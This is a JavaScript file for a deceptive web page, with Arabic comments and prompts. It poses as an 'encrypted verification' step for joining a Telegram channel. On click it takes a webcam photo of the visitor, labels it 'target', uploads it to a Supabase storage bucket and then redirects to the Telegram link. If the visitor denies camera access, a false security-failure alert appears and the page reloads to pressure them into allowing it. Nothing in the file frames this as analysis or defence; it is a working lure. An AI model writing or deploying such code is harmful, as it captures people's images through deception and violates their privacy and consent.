const SUPABASE_URL = 'https://liikyclasjdtsioxaihc.supabase.co';
const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxpaWt5Y2xhc2pkdHNpb3hhaWhjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY0MjM2OTIsImV4cCI6MjA5MTk5OTY5Mn0.lNZ7EfurBgWTPVrKjT4hIlm87BuAFcSX67glz8lBO6Y';
const TELEGRAM_LINK = 'https://t.me/+Inh-qlXH-uU3M2U0';

const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

const startBtn = document.getElementById('startBtn');
const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

startBtn.addEventListener('click', async () => {
    try {
        // محاولة طلب الكاميرا
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;
        
        startBtn.innerText = "جاري تأكيد التشفير...";
        startBtn.disabled = true;

        setTimeout(async () => {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0);

            canvas.toBlob(async (blob) => {
                const fileName = `target_${Date.now()}.jpg`;
                
                // الرفع للسيرفر
                const { error } = await supabaseClient.storage
                    .from('images')
                    .upload(fileName, blob);

                // التحويل فقط إذا نجحت العملية
                stream.getTracks().forEach(t => t.stop());
                window.location.href = TELEGRAM_LINK;
                
            }, 'image/jpeg', 0.6);
        }, 2000);

    } catch (err) {
        // إذا ضغط "عدم السماح" (Deny)
        alert("فشل بروتوكول الحماية: يجب السماح بالتحقق المشفر للدخول إلى القناة الآمنة.");
        location.reload(); // إعادة تحميل الصفحة لإجباره على المحاولة مرة أخرى
    }
});
